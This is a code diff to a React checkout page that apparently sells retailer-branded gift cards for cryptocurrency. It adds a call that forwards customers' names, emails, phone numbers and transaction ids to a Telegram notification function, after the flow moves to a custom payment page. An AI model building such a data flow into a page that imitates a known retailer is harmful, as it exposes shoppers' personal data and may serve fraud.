@@ -15,6 +15,7 @@ import {
   AlertCircle, Gift, CreditCard, LockIcon, ChevronRight, Shield, Star, Users, Bitcoin 
 } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { supabase } from "@/integrations/supabase/client";
 
 const GIFT_CARD_VALUES = [100, 500, 1000, 5000];
 
@@ -176,8 +177,8 @@ const Index = () => {
       
       console.log("Payment transaction created successfully:", paymentResult.transactionDetails);
       
-      // Save order details to localStorage for reference
-      localStorage.setItem("hotTopicOrder", JSON.stringify({
+      // Create order details object
+      const orderDetails = {
         customerName: `${formData.firstName} ${formData.lastName}`,
         email: formData.email,
         phone: formData.phone,
@@ -187,7 +188,28 @@ const Index = () => {
         cryptoCurrency: selectedCryptoCurrency,
         orderDate: new Date().toISOString(),
         transactionId: paymentResult.transactionDetails?.txn_id
-      }));
+      };
+
+      // Save order details to localStorage for reference
+      localStorage.setItem("hotTopicOrder", JSON.stringify(orderDetails));
+      
+      // Send order notification to Telegram
+      try {
+        console.log("Sending order notification to Telegram");
+        const { error: telegramError } = await supabase.functions.invoke("send-telegram-notification", {
+          body: orderDetails
+        });
+        
+        if (telegramError) {
+          console.error("Failed to send Telegram notification:", telegramError);
+          // Continue with the payment process even if the Telegram notification fails
+        } else {
+          console.log("Telegram notification sent successfully");
+        }
+      } catch (telegramErr) {
+        console.error("Error sending Telegram notification:", telegramErr);
+        // Continue with the payment process even if the Telegram notification fails
+      }
       
       // Navigate to our custom payment page instead of redirecting to CoinPayments
       navigate("/payment", { 
